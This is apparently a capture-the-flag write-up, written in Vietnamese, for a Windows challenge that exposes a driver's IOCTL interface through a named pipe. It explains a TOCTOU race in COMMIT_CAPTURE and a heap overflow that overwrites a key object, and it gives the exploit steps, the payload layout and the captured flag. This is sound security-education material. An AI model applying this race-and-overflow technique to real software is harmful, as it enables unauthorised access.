# WinCapture / PktTrack Writeup

## Tóm tắt

Challenge chạy một wrapper userland `wincap_server.exe` expose named pipe `\\.\pipe\WinCapture`, còn `WinCapture.sys` cho mình đủ context để recover IOCTL interface và object model. Bug thật sự là một race kiểu TOCTOU trong đường `COMMIT_CAPTURE`, cho phép overflow từ `current_ptr` sang `key_ptr` và thỏa điều kiện lấy flag.

## Giao thức

Server dùng protocol nhị phân:

```c
request  = [DWORD ioctl][DWORD input_len][input bytes...]
response = [DWORD status][DWORD output_len][output bytes...]
```

Các IOCTL quan trọng:

- `0xC2002000`: `SET_SLOT(slot_idx, slot_len, data...)`
- `0xC2002004`: `ALLOC_BUFFER(size)`
- `0xC2002008`: `CREATE_KEY()`
- `0xC200200C`: `COMMIT_CAPTURE(slot_idx)`
- `0xC2002010`: `GET_FLAG()`

Global state đáng chú ý:

- `current_ptr`
- `current_size`
- `key_ptr`

Điều kiện thành công trong `GET_FLAG()`:

```c
key_ptr != NULL
*(DWORD *)(key_ptr + 0) == 0x4B455901
*(DWORD *)(key_ptr + 4) != 0
```

Tức là chỉ cần làm 8 byte đầu của `key_ptr` thành:

```c
0x4B455901, 0x00000001
```

## Phân tích bug

Bug nằm trong `COMMIT_CAPTURE`. Logic rút gọn:

```c
lock(slot_mutex[slot]);
len = slot[slot].len;
unlock(slot_mutex[slot]);

if (len > current_size)
    fail;

Sleep(2);

lock(slot_mutex[slot]);
len = slot[slot].len;
tmp = slot[slot].data[0:len];
unlock(slot_mutex[slot]);

memcpy(current_ptr, tmp, min(len, 0x1000));
```

Vấn đề:

- `len <= current_size` được check bằng giá trị cũ
- sau `Sleep(2)` code đọc lại `len` mới
- không re-check `len` mới trước khi `memcpy`

Nên đây là TOCTOU race:

1. Ban đầu để `slot_len` nhỏ để pass check.
2. Trong cửa sổ `Sleep(2)`, đổi `slot_len` thành lớn hơn `current_size`.
3. `memcpy` sẽ copy theo `len` mới và overflow khỏi `current_ptr`.

## Vì sao overflow đè được `key_ptr`

Allocator của wrapper là bump allocator có căn 16 byte:

```c
aligned = (size + 0xf) & ~0xf;
ptr = heap + heap_off;
heap_off += aligned;
```

Khai thác dùng chuỗi:

1. `ALLOC_BUFFER(8)`
2. `CREATE_KEY()`

Vì `8` sẽ được align thành `0x10`, layout sẽ là:

```text
heap + 0x00 : current_ptr chunk (0x10 bytes)
heap + 0x10 : key_ptr chunk    (0x10 bytes)
```

Nên nếu `COMMIT_CAPTURE` copy `0x18` byte vào `current_ptr`, thì:

- `0x10` byte đầu lấp đầy chunk đầu tiên
- `0x08` byte tiếp theo ghi đè đúng 8 byte đầu của `key_ptr`

Payload lớn:

```c
"A" * 0x10 + p32(0x4B455901) + p32(1)
```

Sau overflow:

```c
*(DWORD *)(key_ptr + 0) = 0x4B455901;
*(DWORD *)(key_ptr + 4) = 1;
```

`GET_FLAG()` sẽ trả về success.

## Chuỗi exploit

Exploit trong `exploit_race.c` làm như sau:

1. Mở nhiều handle tới `\\.\pipe\WinCapture`.
2. Gọi `ALLOC_BUFFER(8)`.
3. Gọi `CREATE_KEY()`.
4. `SET_SLOT(0, 8, small_data)` để giá trị `slot_len` nhỏ lúc check.
5. Tạo thread gọi `COMMIT_CAPTURE(0)`.
6. Trong lúc thread kia đang ở cửa sổ race, spam:

```c
SET_SLOT(0, 0x18, "A"*0x10 + p32(KEY_MAGIC) + p32(1))
```

7. Poll `GET_FLAG()` tới khi nhận `WINCAPTURE_ACCESS_GRANTED`.

Do race window ngắn, exploit thử nhiều lần với các delay microsecond khác nhau cho tới khi trúng.

## Kết quả

Flag lấy được từ instance:

```text
OmniCTF{d1_b4a12abc41c7154a_81d3868abaa4a3b09284f1a943014478_595483766b35904ab5c393786a2a211a}
```

File liên quan:

- `exploit_race.c`
- `exploit_race.exe`
- `live_response1.txt`
